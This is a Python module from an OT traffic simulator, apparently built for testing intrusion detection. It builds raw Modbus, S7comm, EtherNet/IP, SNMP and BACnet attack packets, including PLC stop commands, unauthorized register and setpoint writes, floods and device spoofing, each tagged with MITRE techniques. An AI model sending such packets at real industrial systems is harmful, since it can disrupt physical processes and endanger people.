# PacketArch — OT Traffic Simulation Platform
# Copyright (c) 2026 Rocky Smith <rocky.d.smith@proton.me>
# Licensed under GPL-3.0. See LICENSE at the repo root.
"""ICS-protocol-specific attack action generators.

Registers generators for Modbus TCP, S7comm, EtherNet/IP, SNMP, and BACnet
attack actions.  Each generator builds raw protocol packets using the
existing packet builder modules, then wraps them in
:class:`~app.protocol_engines.types.PacketEvent` via the shared helper
:func:`_scapy_to_packet_event`.

All generators follow the standard signature::

    def generate(
        params: dict[str, Any],
        targets: list[TargetInfo],
        attacker_ip: str,
        start_time_ms: float,
    ) -> Iterator[PacketEvent]
"""

from __future__ import annotations

import logging
import random
import struct
from typing import Any, Iterator

from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Raw

from app.protocol_engines.types import PacketEvent

from .action_registry import (
    TargetInfo,
    _scapy_to_packet_event,
    register_action,
)

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _build_modbus_raw_packet(
    src_ip: str,
    dst_ip: str,
    payload: bytes,
    src_port: int = 0,
    dst_port: int = 502,
) -> bytes:
    """Build a raw Modbus-over-TCP Ethernet frame."""
    if src_port == 0:
        src_port = random.randint(49152, 65535)
    pkt = (
        Ether()
        / IP(src=src_ip, dst=dst_ip)
        / TCP(sport=src_port, dport=dst_port, flags="PA",
              seq=random.randint(1000, 0xFFFFFF),
              ack=random.randint(1000, 0xFFFFFF))
        / Raw(load=payload)
    )
    return pkt


def _build_mbap(transaction_id: int, unit_id: int, pdu: bytes) -> bytes:
    """Build MBAP header + PDU."""
    length = len(pdu) + 1  # +1 for unit_id
    return struct.pack(">HHHB", transaction_id, 0, length, unit_id) + pdu


# ---------------------------------------------------------------------------
# Modbus attack actions
# ---------------------------------------------------------------------------


@register_action("modbus_unit_enum")
def _modbus_unit_enum(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Enumerate Modbus unit IDs using FC 17 (Report Server ID).

    Scans a range of unit IDs to discover responding devices.
    CV should detect: Modbus function code scanning / enumeration.
    """
    unit_range = params.get("unit_range", [1, 32])
    start_uid, end_uid = int(unit_range[0]), int(unit_range[1])
    interval_ms = params.get("interval_ms", 200)

    tid = random.randint(1, 65535)
    current_time = start_time_ms

    for target in targets:
        for uid in range(start_uid, end_uid + 1):
            # FC 17 = Report Server ID (0x11)
            pdu = bytes([0x11])
            payload = _build_mbap(tid, uid, pdu)
            pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
            yield _scapy_to_packet_event(current_time, pkt, "modbus_unit_enum", {
                "target_ip": target.ip_address,
                "unit_id": uid,
                "function_code": 0x11,
                "mitre_technique": "T0842",
            })
            tid = (tid + 1) & 0xFFFF
            current_time += interval_ms + random.randint(-20, 20)


@register_action("modbus_read_probe")
def _modbus_read_probe(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Read holding registers across wide address ranges (FC 3).

    Probes register space to map device data.
    CV should detect: unusual register address ranges.
    """
    address_ranges = params.get("address_ranges", [[0, 100], [8192, 8300]])
    quantity = params.get("quantity", 10)
    step = params.get("step", 10)
    interval_ms = params.get("interval_ms", 150)

    tid = random.randint(1, 65535)
    unit_id = params.get("unit_id", 1)
    current_time = start_time_ms

    for target in targets:
        for addr_range in address_ranges:
            start_addr, end_addr = int(addr_range[0]), int(addr_range[1])
            for addr in range(start_addr, end_addr, step):
                count = min(quantity, end_addr - addr)
                # FC 3 = Read Holding Registers
                pdu = struct.pack(">BHH", 0x03, addr, count)
                payload = _build_mbap(tid, unit_id, pdu)
                pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
                yield _scapy_to_packet_event(current_time, pkt, "modbus_read_probe", {
                    "target_ip": target.ip_address,
                    "start_address": addr,
                    "quantity": count,
                    "mitre_technique": "T0802",
                })
                tid = (tid + 1) & 0xFFFF
                current_time += interval_ms + random.randint(-20, 20)


@register_action("modbus_write_coil")
def _modbus_write_coil(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Unauthorized write to coil outputs (FC 5).

    CV should detect: unauthorized write operations.
    """
    address = params.get("address", 0)
    count = params.get("count", 5)
    interval_ms = params.get("interval_ms", 500)

    tid = random.randint(1, 65535)
    unit_id = params.get("unit_id", 1)
    current_time = start_time_ms

    for target in targets:
        for i in range(count):
            coil_addr = address + i
            # FC 5 = Write Single Coil, 0xFF00 = ON
            value = 0xFF00 if random.random() > 0.3 else 0x0000
            pdu = struct.pack(">BHH", 0x05, coil_addr, value)
            payload = _build_mbap(tid, unit_id, pdu)
            pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
            yield _scapy_to_packet_event(current_time, pkt, "modbus_write_coil", {
                "target_ip": target.ip_address,
                "coil_address": coil_addr,
                "value": value,
                "mitre_technique": "T0855",
            })
            tid = (tid + 1) & 0xFFFF
            current_time += interval_ms + random.randint(-50, 50)


@register_action("modbus_write_register")
def _modbus_write_register(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Unauthorized write to holding registers (FC 6 / FC 16).

    CV should detect: unauthorized register write operations.
    """
    address = params.get("address", 0)
    count = params.get("count", 5)
    use_multi = params.get("use_multi_write", False)
    interval_ms = params.get("interval_ms", 500)

    tid = random.randint(1, 65535)
    unit_id = params.get("unit_id", 1)
    current_time = start_time_ms

    for target in targets:
        if use_multi:
            # FC 16 = Write Multiple Registers
            values = [random.randint(0, 65535) for _ in range(count)]
            data_bytes = b"".join(struct.pack(">H", v) for v in values)
            pdu = struct.pack(">BHHB", 0x10, address, count, count * 2) + data_bytes
            payload = _build_mbap(tid, unit_id, pdu)
            pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
            yield _scapy_to_packet_event(current_time, pkt, "modbus_write_register", {
                "target_ip": target.ip_address,
                "start_address": address,
                "quantity": count,
                "function_code": 0x10,
                "mitre_technique": "T0836",
            })
        else:
            for i in range(count):
                reg_addr = address + i
                value = random.randint(0, 65535)
                # FC 6 = Write Single Register
                pdu = struct.pack(">BHH", 0x06, reg_addr, value)
                payload = _build_mbap(tid, unit_id, pdu)
                pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
                yield _scapy_to_packet_event(current_time, pkt, "modbus_write_register", {
                    "target_ip": target.ip_address,
                    "register_address": reg_addr,
                    "value": value,
                    "function_code": 0x06,
                    "mitre_technique": "T0836",
                })
                tid = (tid + 1) & 0xFFFF
                current_time += interval_ms + random.randint(-50, 50)


@register_action("modbus_force_listen")
def _modbus_force_listen(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Force Modbus device into listen-only mode (FC 8 sub-function 4).

    CV should detect: Modbus diagnostic command / denial of service.
    """

    tid = random.randint(1, 65535)
    unit_id = params.get("unit_id", 0)  # broadcast

    for target in targets:
        # FC 8, sub-function 0x0004 = Force Listen Only Mode
        pdu = bytes([0x08]) + struct.pack(">HH", 0x0004, 0x0000)
        payload = _build_mbap(tid, unit_id, pdu)
        pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
        yield _scapy_to_packet_event(start_time_ms, pkt, "modbus_force_listen", {
            "target_ip": target.ip_address,
            "mitre_technique": "T0814",
        })


@register_action("coil_flood")
def _coil_flood(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Rapid-fire coil writes — DoS-style attack (FC 5).

    CV should detect: write flood pattern, abnormal traffic rate.
    """
    address = params.get("address", 0)
    count = params.get("count", 64)
    rate_ms = params.get("rate_ms", 50)

    tid = random.randint(1, 65535)
    unit_id = params.get("unit_id", 1)
    current_time = start_time_ms

    for target in targets:
        for i in range(count):
            coil_addr = address + (i % 16)  # cycle through 16 coils
            value = 0xFF00 if (i % 2 == 0) else 0x0000  # toggle
            pdu = struct.pack(">BHH", 0x05, coil_addr, value)
            payload = _build_mbap(tid, unit_id, pdu)
            pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
            yield _scapy_to_packet_event(current_time, pkt, "coil_flood", {
                "target_ip": target.ip_address,
                "coil_address": coil_addr,
                "mitre_technique": "T0855",
            })
            tid = (tid + 1) & 0xFFFF
            current_time += rate_ms + random.randint(0, 10)


@register_action("register_manipulation")
def _register_manipulation(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Gradual register value corruption — stealthy process manipulation.

    Incrementally changes register values to drift process parameters.
    CV should detect: value drift patterns, unauthorized writes.
    """
    base_address = params.get("address", 40000)
    register_count = params.get("register_count", 4)
    steps = params.get("steps", 20)
    interval_ms = params.get("interval_ms", 2000)
    drift_per_step = params.get("drift_per_step", 50)

    tid = random.randint(1, 65535)
    unit_id = params.get("unit_id", 1)
    current_time = start_time_ms
    current_values = [random.randint(1000, 30000) for _ in range(register_count)]

    for target in targets:
        for step in range(steps):
            # Drift each register slightly
            for j in range(register_count):
                drift = random.randint(-drift_per_step, drift_per_step)
                current_values[j] = max(0, min(65535, current_values[j] + drift))

            # Write all registers at once (FC 16)
            data_bytes = b"".join(struct.pack(">H", v) for v in current_values)
            pdu = (
                struct.pack(">BHHB", 0x10, base_address, register_count,
                            register_count * 2)
                + data_bytes
            )
            payload = _build_mbap(tid, unit_id, pdu)
            pkt = _build_modbus_raw_packet(attacker_ip, target.ip_address, payload)
            yield _scapy_to_packet_event(current_time, pkt, "register_manipulation", {
                "target_ip": target.ip_address,
                "step": step,
                "values": list(current_values),
                "mitre_technique": "T0836",
            })
            tid = (tid + 1) & 0xFFFF
            current_time += interval_ms + random.randint(-200, 200)


# ---------------------------------------------------------------------------
# S7comm attack actions
# ---------------------------------------------------------------------------


def _build_s7_attack_packet(
    src_ip: str,
    dst_ip: str,
    s7_payload: bytes,
    src_port: int = 0,
) -> bytes:
    """Build a full TPKT/COTP/S7 Ethernet frame for attack traffic."""
    if src_port == 0:
        src_port = random.randint(49152, 65535)

    # COTP DT header (data transfer, last fragment)
    cotp = bytes([0x02, 0xF0, 0x80])
    # TPKT header
    total_len = 4 + len(cotp) + len(s7_payload)
    tpkt = struct.pack(">BBH", 0x03, 0x00, total_len)

    raw_payload = tpkt + cotp + s7_payload
    pkt = (
        Ether()
        / IP(src=src_ip, dst=dst_ip)
        / TCP(sport=src_port, dport=102, flags="PA",
              seq=random.randint(1000, 0xFFFFFF),
              ack=random.randint(1000, 0xFFFFFF))
        / Raw(load=raw_payload)
    )
    return pkt


@register_action("s7_stop_cpu")
def _s7_stop_cpu(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Send S7 CPU STOP command.

    CV should detect: PLC stop command, unauthorized control.
    """
    from app.protocol_engines.external.exploit_patterns import S7_ATTACK_PATTERNS

    current_time = start_time_ms

    for target in targets:
        # Use pre-built stop CPU payload (includes TPKT/COTP/S7)
        stop_payload = S7_ATTACK_PATTERNS["stop_cpu"]
        pkt = (
            Ether()
            / IP(src=attacker_ip, dst=target.ip_address)
            / TCP(sport=random.randint(49152, 65535), dport=102, flags="PA",
                  seq=random.randint(1000, 0xFFFFFF),
                  ack=random.randint(1000, 0xFFFFFF))
            / Raw(load=stop_payload)
        )
        yield _scapy_to_packet_event(current_time, pkt, "s7_stop_cpu", {
            "target_ip": target.ip_address,
            "mitre_technique": "T0816",
        })
        current_time += random.randint(500, 2000)


@register_action("s7_read_szl")
def _s7_read_szl(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Read S7 System Status List (SZL) — device enumeration.

    Queries SZL IDs to extract module identification, firmware versions,
    and system configuration.
    CV should detect: S7 unauthorized system information access.
    """
    szl_ids = params.get("szl_ids", [0x0011, 0x001C, 0x0111])
    interval_ms = params.get("interval_ms", 500)

    current_time = start_time_ms
    pdu_ref = random.randint(1, 65535)

    for target in targets:
        for szl_id in szl_ids:
            # Build S7 userdata SZL request
            # S7 header: protocol_id=0x32, pdu_type=0x07 (userdata)
            param = bytes([
                0x00, 0x01, 0x12, 0x04, 0x11, 0x44, 0x01, 0x00,
            ])
            data = struct.pack(">BBHH",
                               0xFF,  # return code
                               0x09,  # transport size (octet string)
                               4,     # data length
                               szl_id)
            data += struct.pack(">H", 0x0000)  # szl_index

            s7_header = struct.pack(">BBHHHHH",
                                    0x32,       # protocol ID
                                    0x07,       # userdata
                                    0x0000,     # redundancy
                                    pdu_ref,
                                    len(param), # param length
                                    len(data),  # data length
                                    0x0000)     # (no error for job)
            # Remove last H for job type — S7 job header is shorter
            s7_header = struct.pack(">BBHHHH",
                                    0x32, 0x07, 0x0000,
                                    pdu_ref,
                                    len(param),
                                    len(data))

            s7_payload = s7_header + param + data
            pkt = _build_s7_attack_packet(attacker_ip, target.ip_address, s7_payload)

            yield _scapy_to_packet_event(current_time, pkt, "s7_read_szl", {
                "target_ip": target.ip_address,
                "szl_id": hex(szl_id),
                "mitre_technique": "T0802",
            })
            pdu_ref = (pdu_ref + 1) & 0xFFFF
            current_time += interval_ms + random.randint(-50, 50)


@register_action("s7_upload_block")
def _s7_upload_block(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """S7 block upload attempt — data theft / program extraction.

    CV should detect: S7 block transfer, unauthorized access.
    """
    from app.protocol_engines.external.exploit_patterns import S7_ATTACK_PATTERNS

    current_time = start_time_ms

    for target in targets:
        upload_payload = S7_ATTACK_PATTERNS["upload_block"]
        pkt = (
            Ether()
            / IP(src=attacker_ip, dst=target.ip_address)
            / TCP(sport=random.randint(49152, 65535), dport=102, flags="PA",
                  seq=random.randint(1000, 0xFFFFFF),
                  ack=random.randint(1000, 0xFFFFFF))
            / Raw(load=upload_payload)
        )
        yield _scapy_to_packet_event(current_time, pkt, "s7_upload_block", {
            "target_ip": target.ip_address,
            "mitre_technique": "T0845",
        })
        current_time += random.randint(200, 1000)


# ---------------------------------------------------------------------------
# EtherNet/IP attack actions
# ---------------------------------------------------------------------------


@register_action("enip_list_identity")
def _enip_list_identity(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """EtherNet/IP ListIdentity broadcast — device enumeration.

    CV should detect: CIP enumeration, device discovery.
    """
    interval_ms = params.get("interval_ms", 300)
    current_time = start_time_ms

    # EtherNet/IP encapsulation header for ListIdentity (command 0x0063)
    enip_header = struct.pack("<HIIHQI",
                              0x0063,  # command: ListIdentity
                              0,       # length (no data)
                              0,       # session handle
                              0,       # status
                              0,       # sender context
                              0)       # options

    for target in targets:
        pkt = (
            Ether()
            / IP(src=attacker_ip, dst=target.ip_address)
            / UDP(sport=random.randint(49152, 65535), dport=44818)
            / Raw(load=enip_header)
        )
        yield _scapy_to_packet_event(current_time, pkt, "enip_list_identity", {
            "target_ip": target.ip_address,
            "mitre_technique": "T0846",
        })
        current_time += interval_ms + random.randint(-30, 30)


@register_action("enip_cip_enum")
def _enip_cip_enum(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """CIP service enumeration via EtherNet/IP — deep device profiling.

    Queries CIP identity object attributes.
    CV should detect: CIP service enumeration.
    """
    interval_ms = params.get("interval_ms", 400)
    current_time = start_time_ms

    # ListServices command (0x0004)
    list_services = struct.pack("<HIIHQI",
                                0x0004, 0, 0, 0, 0, 0)

    for target in targets:
        # ListServices request
        pkt = (
            Ether()
            / IP(src=attacker_ip, dst=target.ip_address)
            / TCP(sport=random.randint(49152, 65535), dport=44818, flags="PA",
                  seq=random.randint(1000, 0xFFFFFF),
                  ack=random.randint(1000, 0xFFFFFF))
            / Raw(load=list_services)
        )
        yield _scapy_to_packet_event(current_time, pkt, "enip_cip_enum", {
            "target_ip": target.ip_address,
            "service": "ListServices",
            "mitre_technique": "T0846",
        })
        current_time += interval_ms


# ---------------------------------------------------------------------------
# SNMP attack actions
# ---------------------------------------------------------------------------


@register_action("snmp_walk")
def _snmp_walk(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """SNMP GetBulk walk of system MIB — device enumeration.

    CV should detect: SNMP enumeration, MIB walk.
    """
    community = params.get("community", "public")
    start_oid = params.get("start_oid", "1.3.6.1.2.1.1")
    num_requests = params.get("num_requests", 15)
    interval_ms = params.get("interval_ms", 200)

    current_time = start_time_ms
    request_id = random.randint(1, 0x7FFFFFFF)

    # OID encoding: simplified for common system MIB OIDs
    oid_parts = [int(x) for x in start_oid.split(".")]

    for target in targets:
        for i in range(num_requests):
            # Build a simplified SNMP GetBulk PDU (BER encoded)
            # This produces traffic that looks like SNMP on the wire
            snmp_pdu = _build_snmp_get_bulk(
                community=community,
                request_id=request_id + i,
                oid_parts=oid_parts,
                max_repetitions=10,
            )

            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=random.randint(49152, 65535), dport=161)
                / Raw(load=snmp_pdu)
            )
            yield _scapy_to_packet_event(current_time, pkt, "snmp_walk", {
                "target_ip": target.ip_address,
                "community": community,
                "oid": start_oid,
                "mitre_technique": "T0846",
            })
            # Simulate walking by incrementing last OID component
            oid_parts = list(oid_parts)
            oid_parts[-1] += 1
            current_time += interval_ms + random.randint(-20, 20)


@register_action("snmp_community_brute")
def _snmp_community_brute(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """SNMP community string brute force.

    CV should detect: SNMP brute force, multiple community strings.
    """
    communities = params.get("communities", [
        "public", "private", "community", "admin", "monitor",
        "snmp", "default", "cisco", "siemens", "manager",
    ])
    interval_ms = params.get("interval_ms", 150)

    current_time = start_time_ms
    request_id = random.randint(1, 0x7FFFFFFF)

    # Query system.sysDescr.0 with each community
    oid_parts = [1, 3, 6, 1, 2, 1, 1, 1, 0]

    for target in targets:
        for i, community in enumerate(communities):
            snmp_pdu = _build_snmp_get_request(
                community=community,
                request_id=request_id + i,
                oid_parts=oid_parts,
            )
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=random.randint(49152, 65535), dport=161)
                / Raw(load=snmp_pdu)
            )
            yield _scapy_to_packet_event(current_time, pkt, "snmp_community_brute", {
                "target_ip": target.ip_address,
                "community": community,
                "mitre_technique": "T0866",
            })
            current_time += interval_ms + random.randint(-20, 20)


@register_action("snmp_set")
def _snmp_set(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """SNMP SET request — unauthorized configuration change.

    Writes values to writable MIB OIDs such as sysContact, sysName,
    or device-specific configuration objects.
    CV should detect: SNMP write attempt, unauthorized configuration change.
    """
    community = params.get("community", "private")
    # Default: overwrite sysContact and sysName
    oid_value_pairs = params.get("oid_value_pairs", [
        {"oid": "1.3.6.1.2.1.1.4.0", "value": "compromised@attacker.local"},
        {"oid": "1.3.6.1.2.1.1.5.0", "value": "PWNED-DEVICE"},
    ])
    interval_ms = params.get("interval_ms", 300)

    current_time = start_time_ms
    request_id = random.randint(1, 0x7FFFFFFF)

    for target in targets:
        for i, pair in enumerate(oid_value_pairs):
            oid_parts = [int(x) for x in pair["oid"].split(".")]
            value_str = str(pair.get("value", ""))
            snmp_pdu = _build_snmp_set_request(
                community=community,
                request_id=request_id + i,
                oid_parts=oid_parts,
                value=value_str,
            )
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=random.randint(49152, 65535), dport=161)
                / Raw(load=snmp_pdu)
            )
            yield _scapy_to_packet_event(current_time, pkt, "snmp_set", {
                "target_ip": target.ip_address,
                "community": community,
                "oid": pair["oid"],
                "mitre_technique": "T0836",
            })
            current_time += interval_ms + random.randint(-30, 30)


@register_action("snmp_trap_flood")
def _snmp_trap_flood(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """SNMPv2c trap flood — overwhelm NMS with fake notifications.

    Sends rapid-fire trap PDUs to the management station to cause
    alert fatigue or denial of service on the NMS.
    CV should detect: SNMP trap flood, abnormal trap rate.
    """
    count = params.get("count", 100)
    rate_ms = params.get("rate_ms", 25)
    community = params.get("community", "public")
    # Generic linkDown trap OID
    trap_oid = params.get("trap_oid", "1.3.6.1.6.3.1.1.5.3")

    current_time = start_time_ms
    request_id = random.randint(1, 0x7FFFFFFF)

    for target in targets:
        for i in range(count):
            snmp_pdu = _build_snmp_v2c_trap(
                community=community,
                request_id=request_id + i,
                trap_oid_parts=[int(x) for x in trap_oid.split(".")],
                uptime_cs=random.randint(100000, 9999999),
            )
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=random.randint(49152, 65535), dport=162)
                / Raw(load=snmp_pdu)
            )
            yield _scapy_to_packet_event(current_time, pkt, "snmp_trap_flood", {
                "target_ip": target.ip_address,
                "trap_oid": trap_oid,
                "mitre_technique": "T0814",
            })
            current_time += rate_ms + random.randint(0, 5)


@register_action("snmp_getbulk_sweep")
def _snmp_getbulk_sweep(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Aggressive SNMP GetBulk sweep across multiple MIB subtrees.

    Walks system, interfaces, IP, and enterprise subtrees for deep
    infrastructure profiling of signal controllers and field devices.
    CV should detect: SNMP mass enumeration, extensive MIB walk.
    """
    community = params.get("community", "public")
    subtrees = params.get("subtrees", [
        "1.3.6.1.2.1.1",       # system
        "1.3.6.1.2.1.2",       # interfaces
        "1.3.6.1.2.1.4",       # ip
        "1.3.6.1.2.1.31",      # ifMIB (extended interfaces)
        "1.3.6.1.4.1",         # enterprises (vendor-specific)
    ])
    requests_per_subtree = params.get("requests_per_subtree", 10)
    interval_ms = params.get("interval_ms", 100)

    current_time = start_time_ms
    request_id = random.randint(1, 0x7FFFFFFF)

    for target in targets:
        for subtree in subtrees:
            oid_parts = [int(x) for x in subtree.split(".")]
            for i in range(requests_per_subtree):
                snmp_pdu = _build_snmp_get_bulk(
                    community=community,
                    request_id=request_id,
                    oid_parts=oid_parts,
                    max_repetitions=25,
                )
                pkt = (
                    Ether()
                    / IP(src=attacker_ip, dst=target.ip_address)
                    / UDP(sport=random.randint(49152, 65535), dport=161)
                    / Raw(load=snmp_pdu)
                )
                yield _scapy_to_packet_event(current_time, pkt, "snmp_getbulk_sweep", {
                    "target_ip": target.ip_address,
                    "subtree": subtree,
                    "mitre_technique": "T0846",
                })
                request_id = (request_id + 1) & 0x7FFFFFFF
                oid_parts = list(oid_parts)
                oid_parts[-1] += 1
                current_time += interval_ms + random.randint(-10, 10)


# ---------------------------------------------------------------------------
# BACnet attack actions
# ---------------------------------------------------------------------------


@register_action("bacnet_whois")
def _bacnet_whois(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """BACnet Who-Is broadcast — device discovery.

    CV should detect: BACnet device enumeration.
    """
    # BACnet/IP BVLC header (type=0x81, function=0x0B original-broadcast)
    # + NPDU (version=1, control=0x20 expecting-reply)
    # + APDU (PDU type=1 unconfirmed, service=8 Who-Is)
    bvlc = bytes([0x81, 0x0B, 0x00, 0x0C])  # 12 bytes total
    npdu = bytes([0x01, 0x20, 0xFF, 0xFF, 0x00, 0xFF])  # broadcast
    apdu = bytes([0x10, 0x08])  # unconfirmed Who-Is

    pkt_bytes = bvlc + npdu + apdu

    for target in targets:
        pkt = (
            Ether()
            / IP(src=attacker_ip, dst=target.ip_address)
            / UDP(sport=47808, dport=47808)
            / Raw(load=pkt_bytes)
        )
        yield _scapy_to_packet_event(start_time_ms, pkt, "bacnet_whois", {
            "target_ip": target.ip_address,
            "mitre_technique": "T0846",
        })


@register_action("bacnet_read_property")
def _bacnet_read_property(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """BACnet ReadProperty requests — device object enumeration.

    Reads object-list, firmware-revision, model-name, and other
    properties to fingerprint BACnet controllers and map the BMS.
    CV should detect: BACnet property enumeration from non-BMS source.
    """
    # BACnet property IDs to enumerate
    property_ids = params.get("property_ids", [
        76,   # object-list
        44,   # firmware-revision
        70,   # model-name
        121,  # vendor-name
        120,  # vendor-identifier
    ])
    device_instance = params.get("device_instance", 100)
    interval_ms = params.get("interval_ms", 300)
    invoke_id = random.randint(0, 254)

    current_time = start_time_ms

    for target in targets:
        for prop_id in property_ids:
            apdu = _build_bacnet_read_property_apdu(
                invoke_id=invoke_id,
                object_type=8,  # device object
                instance=device_instance,
                property_id=prop_id,
            )
            pkt_bytes = _build_bacnet_ip_frame(apdu, broadcast=False)
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=47808, dport=47808)
                / Raw(load=pkt_bytes)
            )
            yield _scapy_to_packet_event(current_time, pkt, "bacnet_read_property", {
                "target_ip": target.ip_address,
                "property_id": prop_id,
                "mitre_technique": "T0802",
            })
            invoke_id = (invoke_id + 1) & 0xFF
            current_time += interval_ms + random.randint(-30, 30)


@register_action("bacnet_write_property")
def _bacnet_write_property(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """BACnet WriteProperty — unauthorized setpoint manipulation.

    Writes to analog-value or analog-output present-value properties
    to alter HVAC setpoints, lighting levels, or other building controls.
    CV should detect: unauthorized BACnet write, setpoint change.
    """
    # Object type 2 = analog-value, property 85 = present-value
    object_type = params.get("object_type", 2)
    instance = params.get("instance", 1)
    property_id = params.get("property_id", 85)  # present-value
    values = params.get("values", [5.0, 40.0, 5.0, 40.0])  # extreme temps
    interval_ms = params.get("interval_ms", 1500)
    invoke_id = random.randint(0, 254)

    current_time = start_time_ms

    for target in targets:
        for value in values:
            apdu = _build_bacnet_write_property_apdu(
                invoke_id=invoke_id,
                object_type=object_type,
                instance=instance,
                property_id=property_id,
                value=value,
            )
            pkt_bytes = _build_bacnet_ip_frame(apdu, broadcast=False)
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=47808, dport=47808)
                / Raw(load=pkt_bytes)
            )
            yield _scapy_to_packet_event(current_time, pkt, "bacnet_write_property", {
                "target_ip": target.ip_address,
                "object_type": object_type,
                "instance": instance,
                "value": value,
                "mitre_technique": "T0836",
            })
            invoke_id = (invoke_id + 1) & 0xFF
            current_time += interval_ms + random.randint(-100, 100)


@register_action("bacnet_whois_flood")
def _bacnet_whois_flood(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """BACnet Who-Is flood — exhaust controller resources.

    Rapid-fire Who-Is broadcasts to overwhelm BACnet device stacks,
    causing BMS communication loss.
    CV should detect: BACnet flood, excessive broadcast traffic.
    """
    count = params.get("count", 200)
    rate_ms = params.get("rate_ms", 15)

    bvlc = bytes([0x81, 0x0B, 0x00, 0x0C])
    npdu = bytes([0x01, 0x20, 0xFF, 0xFF, 0x00, 0xFF])
    apdu = bytes([0x10, 0x08])
    pkt_bytes = bvlc + npdu + apdu

    current_time = start_time_ms

    for target in targets:
        for _ in range(count):
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=47808, dport=47808)
                / Raw(load=pkt_bytes)
            )
            yield _scapy_to_packet_event(current_time, pkt, "bacnet_whois_flood", {
                "target_ip": target.ip_address,
                "mitre_technique": "T0814",
            })
            current_time += rate_ms + random.randint(0, 5)


@register_action("bacnet_iam_spoof")
def _bacnet_iam_spoof(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """BACnet I-Am spoofing — inject false device identities.

    Broadcasts I-Am responses with fabricated device instances to
    confuse BMS device tables and disrupt supervisory control.
    CV should detect: BACnet device spoofing, duplicate device instances.
    """
    count = params.get("count", 20)
    interval_ms = params.get("interval_ms", 500)
    start_instance = params.get("start_instance", 9000)

    current_time = start_time_ms

    for target in targets:
        for i in range(count):
            device_instance = start_instance + i
            iam_apdu = _build_bacnet_iam_apdu(
                device_instance=device_instance,
                max_apdu=1476,
                vendor_id=random.randint(0, 999),
            )
            pkt_bytes = _build_bacnet_ip_frame(iam_apdu, broadcast=True)
            pkt = (
                Ether()
                / IP(src=attacker_ip, dst=target.ip_address)
                / UDP(sport=47808, dport=47808)
                / Raw(load=pkt_bytes)
            )
            yield _scapy_to_packet_event(current_time, pkt, "bacnet_iam_spoof", {
                "target_ip": target.ip_address,
                "spoofed_instance": device_instance,
                "mitre_technique": "T0830",
            })
            current_time += interval_ms + random.randint(-50, 50)


# ---------------------------------------------------------------------------
# Cross-device communication
# ---------------------------------------------------------------------------


@register_action("cross_device_comm")
def _cross_device_comm(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Traffic between devices that don't normally communicate.

